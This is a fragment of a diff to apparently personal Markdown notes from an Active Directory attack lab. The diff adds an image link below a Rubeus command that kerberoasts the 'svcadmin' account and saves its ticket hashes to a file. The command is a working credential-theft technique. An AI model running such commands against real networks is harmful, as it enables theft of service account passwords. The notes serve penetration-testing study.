@@ -593,3 +593,4 @@ We try to kerberoast it
 ```cmd
 C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
 ```
+![[Pasted image 20231025154546.png]]
